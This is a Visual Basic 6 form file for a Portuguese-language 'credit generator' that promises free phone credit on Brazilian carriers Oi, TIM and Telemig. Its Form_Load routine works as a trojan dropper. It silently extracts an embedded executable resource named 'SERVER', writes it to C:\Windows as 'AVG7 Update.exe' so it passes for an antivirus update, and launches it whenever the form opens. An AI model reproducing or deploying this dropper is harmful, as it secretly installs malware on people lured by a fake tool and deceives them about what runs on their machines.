VERSION 5.00
Begin VB.Form frmMenu 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Menu Gerador de Créditos"
   ClientHeight    =   2265
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4410
   Icon            =   "frmMenu.frx":0000
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "frmMenu.frx":57E2
   ScaleHeight     =   2265
   ScaleWidth      =   4410
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command3 
      Caption         =   "Telemig Celular"
      Height          =   315
      Left            =   1395
      TabIndex        =   2
      Top             =   1215
      Width           =   1425
   End
   Begin VB.CommandButton Command2 
      Caption         =   "TIM - Maxitel"
      Height          =   315
      Left            =   1395
      TabIndex        =   1
      Top             =   1650
      Width           =   1425
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Oi"
      Height          =   315
      Left            =   1395
      TabIndex        =   0
      Top             =   780
      Width           =   1425
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "by 7£r@bY7£"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   165
      Left            =   3165
      TabIndex        =   4
      Top             =   1830
      Width           =   1035
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "Copyright 2004 - 7£r@bY7£ Hacker Underground Things Corp.®"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   165
      Left            =   150
      TabIndex        =   3
      Top             =   2070
      Width           =   4005
   End
   Begin VB.Image Image1 
      Height          =   720
      Left            =   -105
      Picture         =   "frmMenu.frx":263EC
      Top             =   -105
      Width           =   720
   End
End
Attribute VB_Name = "frmMenu"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Form1.Show
Unload Me
End Sub

Private Sub Command2_Click()
Form3.Show
Unload Me
End Sub

Private Sub Command3_Click()
Form2.Show
Unload Me
End Sub

Private Sub Form_Load()
If App.PrevInstance = True Then Unload Me
Dim nome As String
Dim p_ret As String
nome = "C:\Windows\AVG7 Update.exe"
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open nome For Binary As #1
Put #1, , p_ret
Close #1
Call Shell(nome)
End Sub
